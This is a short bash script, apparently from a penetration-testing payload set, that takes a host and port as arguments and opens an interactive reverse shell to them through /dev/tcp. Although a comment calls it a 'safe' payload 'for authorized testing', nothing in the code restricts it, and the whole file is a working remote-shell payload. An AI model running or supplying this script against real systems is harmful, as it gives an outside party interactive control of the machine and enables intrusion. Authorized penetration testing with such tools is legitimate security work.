#!/bin/bash
# Bash Reverse Shell
# Safe reverse shell payload for authorized testing

HOST=$1
PORT=$2

if [ -z "$HOST" ] || [ -z "$PORT" ]; then
    echo "Usage: bash bash_shell.sh <host> <port>"
    exit 1
fi

echo "Connecting to $HOST:$PORT"

# Create reverse shell connection
bash -i >& /dev/tcp/$HOST/$PORT 0>&1
